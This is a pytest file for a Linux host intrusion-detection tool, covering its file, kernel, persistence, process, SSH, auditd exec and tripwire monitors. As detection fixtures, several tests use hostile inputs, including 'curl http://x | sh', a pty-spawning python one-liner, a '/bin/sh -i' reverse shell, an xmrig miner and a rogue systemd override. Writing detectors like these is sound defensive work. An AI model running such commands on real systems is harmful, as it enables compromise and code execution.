"""Tests for the signal/noise changes: rename-aware critical files, /proc/modules
polling, systemd drop-ins, persistent process memory, container processes,
SSH login windows, config warnings, alert retention and interface exclusion."""
from __future__ import annotations

import os
from collections import namedtuple
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from cop.alerts import Severity
from cop.baseline import BaselineDB
from cop.config import (
    AuthMonitorConfig,
    FileMonitorConfig,
    KernelMonitorConfig,
    PersistenceMonitorConfig,
    ProcessMonitorConfig,
    _build_config,
)
from cop.monitors.auth import AuthMonitor
from cop.monitors.file import FileMonitor
from cop.monitors.kernel import KernelMonitor
from cop.monitors.persistence import PersistenceMonitor
from cop.monitors.process import ProcessMonitor, normalize_exe, normalize_name


@pytest.fixture
def engine():
    e = AsyncMock()
    e.fire = AsyncMock(return_value=True)
    return e


@pytest.fixture
def baseline():
    b = AsyncMock()
    b.get_process_baseline = AsyncMock(return_value=[])
    b.get_container_baseline = AsyncMock(return_value=[])
    return b


def fired(engine):
    return [c.args[0] for c in engine.fire.call_args_list]


# --- FileMonitor ---------------------------------------------------------

class TestFileMonitor:
    def _monitor(self, baseline, engine, **cfg):
        m = FileMonitor(FileMonitorConfig(**cfg), baseline, engine)
        m._mount_map_refreshed = float("inf")  # no Docker lookups in tests
        return m

    @pytest.mark.asyncio
    async def test_rename_onto_passwd_is_critical(self, baseline, engine):
        m = self._monitor(baseline, engine)
        await m._process_event({"event_type": "moved", "src_path": "/etc/passwd+", "dest_path": "/etc/passwd"})
        (a,) = fired(engine)
        assert a.rule_id == "file_critical_modified"
        assert a.severity == Severity.CRITICAL
        assert "/etc/passwd+ -> /etc/passwd" in a.message

    @pytest.mark.asyncio
    async def test_drop_in_dirs_are_critical(self, baseline, engine):
        m = self._monitor(baseline, engine)
        for path in ("/etc/sudoers.d/evil", "/etc/ssh/sshd_config.d/10-hardening.conf", "/etc/pam.d/sshd"):
            await m._process_event({"event_type": "modified", "src_path": path, "dest_path": ""})
        assert all(a.rule_id == "file_critical_modified" for a in fired(engine))
        assert len(fired(engine)) == 3

    @pytest.mark.asyncio
    async def test_extra_critical_paths_extend_defaults(self, baseline, engine):
        m = self._monitor(baseline, engine, extra_critical_paths=["/mnt/data/*.sh"])
        await m._process_event({"event_type": "modified", "src_path": "/mnt/data/take-snapshot.sh", "dest_path": ""})
        await m._process_event({"event_type": "modified", "src_path": "/etc/shadow", "dest_path": ""})
        assert [a.rule_id for a in fired(engine)] == ["file_critical_modified"] * 2

    @pytest.mark.asyncio
    async def test_move_from_ignored_name_still_alerts(self, baseline, engine):
        m = self._monitor(baseline, engine)
        await m._process_event({"event_type": "moved", "src_path": "/etc/sudoers.tmp", "dest_path": "/etc/sudoers"})
        assert fired(engine)[0].rule_id == "file_critical_modified"

    @pytest.mark.asyncio
    async def test_quiet_during_package_ops_but_not_for_critical(self, baseline, engine):
        m = self._monitor(baseline, engine)
        with patch.object(m, "_package_op_running", return_value=True):
            await m._process_event({"event_type": "modified", "src_path": "/etc/ssl/certs/ca-certificates.crt", "dest_path": ""})
            await m._process_event({"event_type": "moved", "src_path": "/etc/passwd+", "dest_path": "/etc/passwd"})
        assert [a.rule_id for a in fired(engine)] == ["file_critical_modified"]


# --- KernelMonitor -------------------------------------------------------

@pytest.mark.asyncio
async def test_kernel_monitor_alerts_on_new_module(tmp_path, baseline, engine):
    mods = tmp_path / "modules"
    mods.write_text("ext4 1 0 - Live 0x0\nloop 1 0 - Live 0x0\n")
    m = KernelMonitor(KernelMonitorConfig(), baseline, engine)
    from cop.monitors.kernel import read_loaded_modules
    m._known_modules |= read_loaded_modules(str(mods))
    mods.write_text("ext4 1 0 - Live 0x0\nloop 1 0 - Live 0x0\nevilkit 1 0 - Live 0x0\n")
    await m._check(str(mods))
    await m._check(str(mods))  # once only
    assert [a.context["module"] for a in fired(engine)] == ["evilkit"]


# --- PersistenceMonitor --------------------------------------------------

@pytest.mark.asyncio
async def test_persistence_dropins_and_modifications(tmp_path, baseline, engine):
    sysdir = tmp_path / "system"
    sysdir.mkdir()
    (sysdir / "ssh.service").write_text("[Service]\n")
    (sysdir / "multi-user.target.wants").mkdir()
    cfg = PersistenceMonitorConfig(cron_paths=[], systemd_paths=[str(sysdir)], known_units=["ok.service"])
    m = PersistenceMonitor(cfg, baseline, engine)
    await m._seed()

    d = sysdir / "ssh.service.d"
    d.mkdir()
    (d / "override.conf").write_text("[Service]\nExecStart=/tmp/x\n")
    (sysdir / "new.timer").write_text("")
    okd = sysdir / "ok.service.d"
    okd.mkdir()
    (okd / "x.conf").write_text("")
    await m._scan_systemd()
    rules = sorted(a.rule_id for a in fired(engine))
    assert rules == ["new_systemd_dropin", "new_systemd_unit"]

    engine.fire.reset_mock()
    st = (sysdir / "ssh.service").stat()
    os.utime(sysdir / "ssh.service", (st.st_atime, st.st_mtime + 10))
    await m._scan_systemd()
    (a,) = fired(engine)
    assert a.rule_id == "systemd_unit_modified"


# --- ProcessMonitor ------------------------------------------------------

def test_normalization():
    assert normalize_name("smbd[192.168.1.5]") == "smbd"
    assert normalize_name("smbd[192.168.1.") == "smbd"
    assert normalize_name("2.1.322") == "*"
    assert normalize_exe("/home/alice/.local/share/claude/versions/2.1.322") == "/home/alice/.local/share/claude/versions/*"
    assert normalize_exe(None) is None


@pytest.mark.asyncio
async def test_process_update_is_not_new(baseline, engine):
    baseline.get_process_baseline = AsyncMock(return_value=[
        {"name": "claude", "exe": "/home/alice/.local/share/claude/versions/2.1.322", "username": "alice"},
    ])
    m = ProcessMonitor(ProcessMonitorConfig(), baseline, engine)
    for p in await baseline.get_process_baseline():
        m._remember(p)
    assert m._is_known({"name": "claude", "exe": "/home/alice/.local/share/claude/versions/2.1.327", "username": "alice"})


@pytest.mark.asyncio
async def test_new_process_is_persisted(baseline, engine):
    m = ProcessMonitor(ProcessMonitorConfig(), baseline, engine)
    proc = {"pid": 999999, "name": "updatedb.plocate", "exe": "/usr/sbin/updatedb.plocate",
            "username": "root", "cmdline": "", "ppid_name": "systemd"}
    with patch("cop.monitors.process.container_id_for_pid", return_value=None):
        await m._handle_new(proc)
    assert fired(engine)[0].rule_id == "new_root_process"
    baseline.add_process_to_baseline.assert_awaited_once()


@pytest.mark.asyncio
async def test_known_container_process_skipped(baseline, engine):
    m = ProcessMonitor(ProcessMonitorConfig(), baseline, engine, known_containers=["sonarr"])
    m._containers.names = {"a" * 64: "sonarr"}
    proc = {"pid": 999999, "name": "s6-rc", "exe": "/package/s6", "username": "root",
            "cmdline": "", "ppid_name": "rc.init"}
    with patch("cop.monitors.process.container_id_for_pid", return_value="a" * 64):
        await m._handle_new(proc)
    assert fired(engine) == []
    baseline.add_process_to_baseline.assert_not_awaited()


@pytest.mark.asyncio
async def test_unknown_container_process_alerts_with_tag(baseline, engine):
    m = ProcessMonitor(ProcessMonitorConfig(), baseline, engine, known_containers=["sonarr"])
    m._containers.names = {"b" * 64: "mystery"}
    proc = {"pid": 999999, "name": "xmrig", "exe": "/xmrig", "username": "root",
            "cmdline": "", "ppid_name": "sh"}
    with patch("cop.monitors.process.container_id_for_pid", return_value="b" * 64):
        await m._handle_new(proc)
    (a,) = fired(engine)
    assert "[mystery]" in a.title


# --- AuthMonitor ---------------------------------------------------------

@pytest.mark.asyncio
async def test_root_login_window(baseline, engine):
    baseline.get_ssh_sources = AsyncMock(return_value=set())
    cfg = AuthMonitorConfig(
        known_ssh_sources=["100.64.0.0/10"],
        restricted_login_users=["root"],
        login_windows=[{"user": "root", "source": "100.64.0.10", "days": ["sun"], "hours": [9, 14]}],
    )
    m = AuthMonitor(cfg, baseline, engine)
    sunday_10 = datetime(2026, 11, 15, 10, 5, tzinfo=timezone.utc)
    tuesday_3 = datetime(2026, 11, 17, 3, 0, tzinfo=timezone.utc)
    await m._handle_ssh_success("root", "100.64.0.10", now=sunday_10)
    assert fired(engine) == []
    await m._handle_ssh_success("root", "100.64.0.10", now=tuesday_3)
    await m._handle_ssh_success("root", "100.99.1.1", now=sunday_10)
    await m._handle_ssh_success("andy", "100.99.1.1", now=tuesday_3)
    assert [a.rule_id for a in fired(engine)] == ["ssh_login_outside_window"] * 2


@pytest.mark.asyncio
async def test_new_user_name_has_no_comma(baseline, engine):
    m = AuthMonitor(AuthMonitorConfig(), baseline, engine)
    await m._handle_line("useradd[1]: new user: name=bee, UID=1003, GID=1003, home=/home/bee")
    assert fired(engine)[0].context["username"] == "bee"


# --- config, DB, interfaces ---------------------------------------------

def test_unknown_config_keys_warned():
    c = _build_config({
        "alerts": {"retention_days": 30, "bogus": 1},
        "monitors": {"network": {"trusted_cidrs": []}, "nope": {}},
        "extra": {},
    })
    assert c.alerts.retention_days == 30
    assert "unknown config key alerts.bogus (ignored)" in c.warnings
    assert "unknown config key monitors.network.trusted_cidrs (ignored)" in c.warnings
    assert "unknown config section monitors.nope (ignored)" in c.warnings
    assert "unknown config section extra (ignored)" in c.warnings


@pytest.mark.asyncio
async def test_prune_alerts(tmp_path):
    async with BaselineDB(tmp_path / "b.db") as db:
        old = (datetime.now(timezone.utc) - timedelta(days=100)).isoformat()
        new = datetime.now(timezone.utc).isoformat()
        for t in (old, old, new):
            await db.record_alert("r", "WARN", "t", "m", "{}", "M", t, False, False)
        assert await db.prune_alerts(90) == 2
        assert len(await db.get_recent_alerts()) == 1
        assert await db.prune_alerts(0) == 0


@pytest.mark.asyncio
async def test_process_learn_is_additive(tmp_path):
    async with BaselineDB(tmp_path / "b.db") as db:
        await db.add_process_to_baseline({"name": "approved", "exe": "/x", "username": "root"})
        await db.set_process_baseline([{"name": "running", "exe": "/y", "username": "root"}], replace=False)
        names = {p["name"] for p in await db.get_process_baseline()}
        assert names == {"approved", "running"}


def test_tunnel_and_vm_interfaces_excluded(baseline, engine):
    from cop.monitors.base import BaseMonitor
    C = namedtuple("C", "bytes_sent bytes_recv")
    counters = {n: C(100, 1000) for n in ("eno2", "tailscale0", "virbr0", "vnet3", "wg0", "lo", "docker0", "veth1", "br-1")}

    class M(BaseMonitor):
        async def run(self): ...
        async def learn(self): ...

    with patch("psutil.net_io_counters", return_value=counters):
        assert M(None, baseline, engine)._external_net_io_counters() == (100, 1000)


# --- CPU: connection sampling only when needed --------------------------

@pytest.mark.asyncio
async def test_no_ss_sampling_until_traffic_episode(baseline, engine):
    from cop.config import NetworkMonitorConfig
    from cop.monitors.network import NetworkMonitor
    m = NetworkMonitor(NetworkMonitorConfig(), baseline, engine)
    m._running = True
    with patch.object(m, "_refresh_proc_cache") as refresh, \
         patch("cop.monitors.base.asyncio.sleep", AsyncMock()):
        await m._sleep_sampling(30, sample=m._attribution_needed())
        assert refresh.call_count == 0
        m._over_since["sent"] = 1.0
        await m._sleep_sampling(30, sample=m._attribution_needed())
        assert refresh.call_count == 6


@pytest.mark.asyncio
async def test_resource_monitor_skips_connection_snapshot_when_net_alerts_off(baseline, engine):
    from cop.config import ResourceMonitorConfig
    from cop.monitors.resource import ResourceMonitor
    m = ResourceMonitor(ResourceMonitorConfig(), baseline, engine)
    with patch.object(m, "_snapshot_connections") as snap:
        m._calc_net_rates()
        m._calc_net_rates()
    snap.assert_not_called()


# --- Mark Expected -------------------------------------------------------

def _alert(rule, monitor, **ctx):
    from cop.alerts import Alert
    return Alert(rule_id=rule, severity=Severity.WARN, title="t", message="m",
                 source_monitor=monitor, context=ctx)


@pytest.mark.asyncio
async def test_mark_expected_file_path_persists_and_silences(tmp_path, engine):
    async with BaselineDB(tmp_path / "b.db") as db:
        m = FileMonitor(FileMonitorConfig(), db, engine)
        m._mount_map_refreshed = float("inf")
        reply = await m.mark_expected(_alert("file_modified", "FileMonitor", src_path="/etc/foo.conf", dest_path=""))
        assert "won't alert again" in reply
        await m._process_event({"event_type": "modified", "src_path": "/etc/foo.conf", "dest_path": ""})
        assert fired(engine) == []
        # survives a restart
        m2 = FileMonitor(FileMonitorConfig(), db, engine)
        assert "/etc/foo.conf" in await m2._approved("file_path")


@pytest.mark.asyncio
async def test_mark_expected_never_silences_critical_or_tripwire(tmp_path, engine):
    from cop.config import TripwireMonitorConfig
    from cop.monitors.tripwire import TripwireMonitor
    async with BaselineDB(tmp_path / "b.db") as db:
        f = FileMonitor(FileMonitorConfig(), db, engine)
        t = TripwireMonitor(TripwireMonitorConfig(), db, engine)
        assert "always alert" in await f.mark_expected(_alert("file_critical_modified", "FileMonitor", src_path="/etc/shadow"))
        assert "always alert" in await t.mark_expected(_alert("tripwire_.env", "TripwireMonitor", path="/root/.env"))
        assert await db.get_approvals() == []


@pytest.mark.asyncio
async def test_mark_expected_kernel_module_survives_restart(tmp_path, engine):
    async with BaselineDB(tmp_path / "b.db") as db:
        k = KernelMonitor(KernelMonitorConfig(), db, engine)
        await k.mark_expected(_alert("kernel_module_loaded", "KernelMonitor", module="wireguard"))
        k2 = KernelMonitor(KernelMonitorConfig(), db, engine)
        assert "wireguard" in await k2._approved("kernel_module")


@pytest.mark.asyncio
async def test_mark_expected_data_volume_does_not_touch_ports(tmp_path, engine):
    """It used to call add_port_to_baseline with the traffic alert's context (KeyError)."""
    from cop.config import NetworkMonitorConfig
    from cop.monitors.network import NetworkMonitor
    async with BaselineDB(tmp_path / "b.db") as db:
        n = NetworkMonitor(NetworkMonitorConfig(), db, engine)
        reply = await n.mark_expected(_alert("data_volume_anomaly", "NetworkMonitor", direction="sent"))
        assert "trusted_docker_containers" in reply
        assert await db.get_port_baseline() == []
        reply = await n.mark_expected(_alert("suspicious_outbound_port", "NetworkMonitor", process_name="xmrig", rport=3333))
        assert "xmrig:3333" in n._approved_outbound


@pytest.mark.asyncio
async def test_telegram_buttons_work_after_restart(tmp_path):
    """The alert behind a button is found in the DB when it's not in memory."""
    import json as _json
    from cop.config import TelegramConfig
    from cop.sinks.telegram import TelegramSink
    async with BaselineDB(tmp_path / "b.db") as db:
        ctx = {"src_path": "/etc/x", "alert_key": "abcd1234"}
        await db.record_alert("file_modified", "WARN", "t", "m", _json.dumps(ctx), "FileMonitor",
                              datetime.now(timezone.utc).isoformat(), False, False)
        sink = TelegramSink(TelegramConfig(), tmp_path)
        sink.set_db(db)
        alert = await sink._lookup_alert("abcd1234")
        assert alert.rule_id == "file_modified" and alert.context["src_path"] == "/etc/x"
        assert await sink._lookup_alert("nope") is None


# --- apt/dpkg run summary ------------------------------------------------

def _pkg_monitor(tmp_path, engine, **cfg):
    from cop.config import PackageMonitorConfig
    from cop.monitors.package import PackageMonitor
    hist = tmp_path / "history.log"
    hist.write_text(
        "Start-Date: 2026-11-18  06:59:56\nCommandline: /usr/bin/unattended-upgrade\n"
        "Upgrade: a:amd64 (1, 2)\nEnd-Date: 2026-11-18  06:59:56\n\n"
        "Start-Date: 2026-11-18  06:59:59\nCommandline: /usr/bin/unattended-upgrade\n"
        "Upgrade: b:amd64 (1, 2)\nEnd-Date: 2026-11-18  07:00:01\n\n"
        "Start-Date: 2026-11-18  09:00:00\nCommandline: apt install sl\nRequested-By: andy (1000)\n"
        "Install: sl:amd64 (5.02-1)\nEnd-Date: 2026-11-18  09:00:02\n"
    )
    return PackageMonitor(PackageMonitorConfig(apt_history_path=str(hist), **cfg), AsyncMock(), engine)


@pytest.mark.asyncio
async def test_unattended_upgrades_become_one_info_summary(tmp_path, engine):
    m = _pkg_monitor(tmp_path, engine)
    for line in (
        "2026-11-18 06:59:56 upgrade a:amd64 1 2",
        "2026-11-18 06:59:56 status installed a:amd64 2",
        "2026-11-18 06:59:59 upgrade b:all 1 2",
    ):
        m._handle_line(line)
    run, m._run = m._run, type(m._run)()
    await m._fire_summary(run)
    (a,) = fired(engine)
    assert a.rule_id == "package_activity"
    assert a.severity == Severity.INFO
    assert a.title == "Packages: 2 upgraded (unattended)"
    assert "By: unattended-upgrades" in a.message


@pytest.mark.asyncio
async def test_manual_install_summary_is_warn_with_who(tmp_path, engine):
    m = _pkg_monitor(tmp_path, engine)
    m._handle_line("2026-11-18 09:00:01 install sl:amd64 <none> 5.02-1")
    m._handle_line("2026-11-18 09:00:01 upgrade libc6:amd64 1 2")
    run, m._run = m._run, type(m._run)()
    await m._fire_summary(run)
    (a,) = fired(engine)
    assert a.severity == Severity.WARN
    assert "1 installed, 1 upgraded" in a.title
    assert "By: andy: apt install sl" in a.message
    assert "Installed: sl 5.02-1" in a.message


@pytest.mark.asyncio
async def test_package_summary_flushes_after_quiet_period(tmp_path, engine):
    m = _pkg_monitor(tmp_path, engine, summary_quiet_seconds=0)
    m._handle_line("2026-11-18 09:00:01 remove sl:amd64 5.02-1 <none>")
    real_sleep = __import__("asyncio").sleep
    calls = {"n": 0}

    async def fake_sleep(_):
        calls["n"] += 1
        if calls["n"] > 1:
            raise __import__("asyncio").CancelledError
        await real_sleep(0)

    with patch("cop.monitors.package.asyncio.sleep", fake_sleep):
        with pytest.raises(__import__("asyncio").CancelledError):
            await m._flush_loop()
    (a,) = fired(engine)
    assert a.severity == Severity.WARN and "1 removed" in a.title
    assert m._run.empty()


@pytest.mark.asyncio
async def test_process_scan_only_reads_new_pids(baseline, engine):
    m = ProcessMonitor(ProcessMonitorConfig(), baseline, engine)
    me = os.getpid()
    procs = m._snapshot_processes({me})
    assert [p["pid"] for p in procs] == [me]
    assert procs[0]["ppid_name"]  # parent resolved even though it wasn't in the set


# --- ExecMonitor (auditd) ------------------------------------------------

_AUDIT_HEALTHCHECK = [
    'type=SYSCALL msg=audit(1795012735.329:38459): arch=c000003e syscall=59 success=yes exit=0 a0=1 a1=2 a2=3 a3=0 items=2 ppid=2674336 pid=2543308 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sh" exe="/bin/busybox" subj=docker-default key="cop_exec"\x1dARCH=x86_64 SYSCALL=execve AUID="unset" UID="root"',
    'type=EXECVE msg=audit(1795012735.329:38459): argc=3 a0="/bin/sh" a1="-c" a2=2F676C756574756E2D656E747279706F696E74206865616C7468636865636B',
    'type=CWD msg=audit(1795012735.329:38459): cwd="/"',
    'type=PROCTITLE msg=audit(1795012735.329:38459): proctitle=2F62696E2F7368',
]


def _exec_monitor(engine, **cfg):
    from cop.config import ExecMonitorConfig
    from cop.monitors.execmon import ExecMonitor
    cfg.setdefault("public_containers", ["jellyfin"])
    return ExecMonitor(ExecMonitorConfig(enabled=True, **cfg), AsyncMock(), engine,
                       suspicious_parent_names=["caddy", "python3", "node"])


def _ev(**kw):
    ev = {"pid": 500, "ppid": 400, "uid": "0", "auid": "4294967295", "comm": "sh",
          "exe": "/bin/dash", "subj": "docker-default", "key": "cop_exec",
          "argv": ["sh", "-c", "id"], "cwd": "/"}
    ev.update(kw)
    return ev


@pytest.mark.asyncio
async def test_audit_records_parse_into_one_event(engine):
    m = _exec_monitor(engine)
    seen = []
    m.check_event = AsyncMock(side_effect=lambda ev: seen.append(ev))
    for line in _AUDIT_HEALTHCHECK:
        await m._handle_line(line + "\n")
    (ev,) = seen
    assert ev["pid"] == 2543308 and ev["ppid"] == 2674336
    assert ev["comm"] == "sh" and ev["exe"] == "/bin/busybox"
    assert ev["argv"] == ["/bin/sh", "-c", "/gluetun-entrypoint healthcheck"]
    assert ev["subj"] == "docker-default"


@pytest.mark.asyncio
async def test_events_with_other_keys_ignored(engine):
    m = _exec_monitor(engine)
    m.check_event = AsyncMock()
    for line in _AUDIT_HEALTHCHECK:
        await m._handle_line(line.replace('key="cop_exec"', 'key="other"'))
    m.check_event.assert_not_awaited()


def _tree(m, procs):
    """procs: pid -> (comm, ppid); stands in for /proc."""
    return patch("cop.monitors.execmon.proc_stat", side_effect=lambda pid: procs.get(pid))


@pytest.mark.asyncio
async def test_app_spawned_shell_in_public_container_is_critical(engine):
    m = _exec_monitor(engine)
    procs = {400: ("jellyfin", 300), 300: ("s6-supervise", 200), 200: ("containerd-shim", 1)}
    with _tree(m, procs), patch.object(m, "_container_of", return_value="jellyfin"), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", return_value=False):
        await m.check_event(_ev(argv=["sh", "-c", "curl http://x | sh"]))
    (a,) = fired(engine)
    assert a.rule_id == "container_suspicious_exec" and a.severity == Severity.CRITICAL
    assert a.title == "jellyfin started sh in jellyfin"
    assert "jellyfin < s6-supervise < containerd-shim" in a.message


@pytest.mark.asyncio
async def test_healthcheck_and_supervisor_scripts_are_quiet(engine):
    m = _exec_monitor(engine)
    procs = {400: ("containerd-shim", 1), 401: ("s6-supervise", 402), 402: ("s6-svscan", 403),
             403: ("containerd-shim", 1)}
    with _tree(m, procs), patch.object(m, "_container_of", return_value="jellyfin"), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", return_value=False):
        await m.check_event(_ev(ppid=400))                       # healthcheck / docker exec
        await m.check_event(_ev(ppid=401, comm="bash", exe="/bin/bash"))  # s6 service script
        await m.check_event(_ev(ppid=401, comm="ffmpeg", exe="/usr/lib/jellyfin-ffmpeg/ffmpeg", argv=["ffmpeg"]))
    assert fired(engine) == []


@pytest.mark.asyncio
async def test_non_public_container_not_checked_for_app_shells(engine):
    m = _exec_monitor(engine)
    procs = {400: ("Sonarr", 300), 300: ("containerd-shim", 1)}
    with _tree(m, procs), patch.object(m, "_container_of", return_value="sonarr"), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", return_value=False):
        await m.check_event(_ev())
    assert fired(engine) == []


@pytest.mark.asyncio
async def test_inline_interpreter_counts_plain_script_does_not(engine):
    m = _exec_monitor(engine)
    procs = {400: ("immich-api", 300), 300: ("tini", 200), 200: ("containerd-shim", 1)}
    with _tree(m, procs), patch.object(m, "_container_of", return_value="jellyfin"), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", return_value=False):
        await m.check_event(_ev(comm="exiftool", exe="/usr/bin/perl", argv=["/usr/bin/perl", "-w", "/usr/bin/exiftool"]))
        assert fired(engine) == []
        await m.check_event(_ev(comm="python3.12", exe="/usr/bin/python3.12", argv=["python3", "-c", "import pty"]))
    assert [a.rule_id for a in fired(engine)] == ["container_suspicious_exec"]


@pytest.mark.asyncio
async def test_exec_from_temp_and_approval(engine, tmp_path):
    async with BaselineDB(tmp_path / "b.db") as db:
        from cop.config import ExecMonitorConfig
        from cop.monitors.execmon import ExecMonitor
        m = ExecMonitor(ExecMonitorConfig(enabled=True), db, engine)
        with _tree(m, {}), patch.object(m, "_container_of", return_value=None):
            await m.check_event(_ev(comm="x", exe="/dev/shm/.x", argv=["/dev/shm/.x"], subj="unconfined"))
            (a,) = fired(engine)
            assert a.rule_id == "exec_from_temp"
            await m.mark_expected(a)
            engine.fire.reset_mock()
            await m.check_event(_ev(comm="x", exe="/dev/shm/.x", argv=["/dev/shm/.x"], subj="unconfined"))
        assert fired(engine) == []


@pytest.mark.asyncio
async def test_reverse_shell_via_parent_socket(engine):
    m = _exec_monitor(engine)
    with _tree(m, {400: ("python3", 1)}), patch.object(m, "_container_of", return_value=None), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", side_effect=lambda pid: pid == 400):
        await m.check_event(_ev(subj="unconfined", argv=["/bin/sh", "-i"]))
    (a,) = fired(engine)
    assert a.rule_id == "reverse_shell"


@pytest.mark.asyncio
async def test_host_shell_from_versioned_python_parent(engine):
    m = _exec_monitor(engine)
    with _tree(m, {400: ("python3.12", 1)}), patch.object(m, "_container_of", return_value=None), \
         patch("cop.monitors.execmon.stdio_on_one_inet_socket", return_value=False):
        await m.check_event(_ev(subj="unconfined"))
    (a,) = fired(engine)
    assert a.rule_id == "suspicious_shell_spawn"


def test_reverse_shell_check_needs_inet_socket():
    """A unix socketpair on stdio (some daemons wire children that way) isn't a reverse shell."""
    import socket
    import subprocess as sp
    from cop.procinfo import stdio_on_one_inet_socket
    a, b = socket.socketpair()
    p = sp.Popen(["sleep", "5"], stdin=a, stdout=a, stderr=a)
    try:
        assert stdio_on_one_inet_socket(p.pid) is False
    finally:
        p.kill(); a.close(); b.close()


def test_reverse_shell_check_detects_tcp_stdio():
    import socket
    import subprocess as sp
    from cop.procinfo import stdio_on_one_inet_socket
    srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(1)
    c = socket.create_connection(srv.getsockname())
    p = sp.Popen(["sleep", "5"], stdin=c, stdout=c, stderr=c)
    try:
        assert stdio_on_one_inet_socket(p.pid) is True
    finally:
        p.kill(); c.close(); srv.close()


@pytest.mark.asyncio
async def test_exec_tail_reads_lines_and_partial_line(tmp_path, engine):
    m = _exec_monitor(engine)
    m._running = True
    log = tmp_path / "audit.log"
    log.write_bytes(b"one\ntwo\nthr")
    got = []

    async def collect():
        async for line in m._tail(str(log), from_end=False):
            got.append(line)
            if len(got) == 3:
                m._running = False

    import asyncio as aio
    task = aio.create_task(collect())
    await aio.sleep(0.05)
    with open(log, "ab") as f:
        f.write(b"ee\n")
    await aio.wait_for(task, 3)
    assert got == ["one", "two", "three"]


# --- Tripwires via auditd ------------------------------------------------

def _trip(tmp_path, engine, **cfg):
    from cop.config import TripwireMonitorConfig
    from cop.monitors.tripwire import TripwireMonitor
    m = TripwireMonitor(TripwireMonitorConfig(**cfg), AsyncMock(), engine)
    m._paths = {"/home/alice/password.txt", "/root/password.txt"}
    m.audit_source = type("A", (), {"parent_chain": lambda self, ppid: ["bash", "sshd"]})()
    return m


def _open_ev(**kw):
    ev = {"pid": 77, "ppid": 70, "uid": "1000", "auid": "1000", "success": "yes", "syscall": "257",
          "comm": "cat", "exe": "/usr/bin/cat", "key": "cop_tripwire", "cwd": "/home/alice",
          "paths": ["/home/alice/password.txt"], "cmdline": "cat password.txt"}
    ev.update(kw)
    return ev


@pytest.mark.asyncio
async def test_audit_tripwire_names_process_and_user(tmp_path, engine):
    m = _trip(tmp_path, engine)
    with patch("cop.monitors.tripwire._username", side_effect=lambda u: {"1000": "alice", "0": "root"}.get(str(u), str(u))):
        await m.on_audit_event(_open_ev())
    (a,) = fired(engine)
    assert a.rule_id == "tripwire_password.txt" and a.severity == Severity.CRITICAL
    assert a.title == "Tripwire: password.txt opened by cat (alice)"
    assert "Parents: bash < sshd" in a.message and "CMD: cat password.txt" in a.message


@pytest.mark.asyncio
async def test_audit_tripwire_allowed_readers(tmp_path, engine):
    m = _trip(tmp_path, engine, allowed_readers=["rsync@root", "indexer", "smbd"])
    users = {"1000": "alice", "0": "root"}
    with patch("cop.monitors.tripwire._username", side_effect=lambda u: users.get(str(u), str(u))):
        await m.on_audit_event(_open_ev(comm="rsync", uid="0"))                 # backup
        await m.on_audit_event(_open_ev(comm="indexer"))                     # indexer
        await m.on_audit_event(_open_ev(comm="smbd[192.168.1.", uid="0"))       # samba
        assert fired(engine) == []
        await m.on_audit_event(_open_ev(comm="rsync", uid="1000"))               # rsync as andy: not the backup
    assert len(fired(engine)) == 1


@pytest.mark.asyncio
async def test_audit_tripwire_relative_path_resolved(tmp_path, engine):
    from cop.monitors.execmon import build_record_event
    recs = {
        "SYSCALL": {"pid": "77", "ppid": "70", "uid": "0", "auid": "0", "success": "yes",
                    "comm": '"cat"', "exe": '"/usr/bin/cat"', "key": '"cop_tripwire"', "syscall": "257"},
        "CWD": {"cwd": '"/root"'},
        "_PATHS": ['"password.txt"'],
        "PROCTITLE": {"proctitle": "636174006361742070617373776F72642E747874"},
    }
    ev = build_record_event(recs)
    assert ev["paths"] == ["/root/password.txt"]
    m = _trip(tmp_path, engine)
    await m.on_audit_event(ev)
    assert fired(engine)[0].context["path"] == "/root/password.txt"


def test_decoy_created_with_content_and_mode(tmp_path, engine):
    from cop.config import TripwireMonitorConfig
    from cop.monitors.tripwire import TripwireMonitor
    target = tmp_path / "sub" / "password.txt"
    cfg = TripwireMonitorConfig(files=[{"path": str(target), "mode": "600", "content": "wifi: hunter2\n"}, str(tmp_path / ".env")])
    m = TripwireMonitor(cfg, AsyncMock(), engine)
    paths = m._setup_files()
    assert paths == {str(target), str(tmp_path / ".env")}
    assert target.read_text() == "wifi: hunter2\n"
    assert oct(target.stat().st_mode & 0o777) == "0o600"


def test_missing_audit_watches_are_added(tmp_path, engine):
    from cop.config import TripwireMonitorConfig
    from cop.monitors.tripwire import TripwireMonitor
    m = TripwireMonitor(TripwireMonitorConfig(), AsyncMock(), engine)
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        out = "-w /root/.env -p rwa -k cop_tripwire\n" if cmd == ["auditctl", "-l"] else ""
        return type("R", (), {"stdout": out, "returncode": 0, "stderr": ""})()

    with patch("cop.monitors.tripwire.subprocess.run", side_effect=fake_run):
        added = m._ensure_audit_watches({"/root/.env", "/root/password.txt"})
    assert added == ["/root/password.txt"]
    assert ["auditctl", "-w", "/root/password.txt", "-p", "rwa", "-k", "cop_tripwire"] in calls


@pytest.mark.asyncio
async def test_audit_tripwire_ignores_xattr_reads_from_ls(tmp_path, engine):
    m = _trip(tmp_path, engine)
    for sc in ("191", "192", "194"):  # ls -l reading ACLs
        await m.on_audit_event(_open_ev(comm="ls", syscall=sc, arch="c000003e"))
    assert fired(engine) == []
    await m.on_audit_event(_open_ev(comm="ls", syscall="257", arch="c000003e"))  # openat
    assert len(fired(engine)) == 1


# --- Telegram formatting -------------------------------------------------

@pytest.mark.asyncio
async def test_telegram_escapes_alert_text(tmp_path):
    """'Parents: bash < sshd' made Telegram reject the message as bad HTML."""
    from cop.alerts import Alert
    from cop.config import TelegramConfig
    from cop.sinks.telegram import TelegramSink
    sink = TelegramSink(TelegramConfig(enabled=True, chat_id="1"), tmp_path)
    bot = AsyncMock()
    sink._app = type("App", (), {"bot": bot})()
    a = Alert(rule_id="tripwire_password.txt", severity=Severity.CRITICAL, title="opened by <cat> & co",
              message="Parents: bash < sshd && x", source_monitor="TripwireMonitor")
    assert await sink.send(a) is True
    text = bot.send_message.call_args.kwargs["text"]
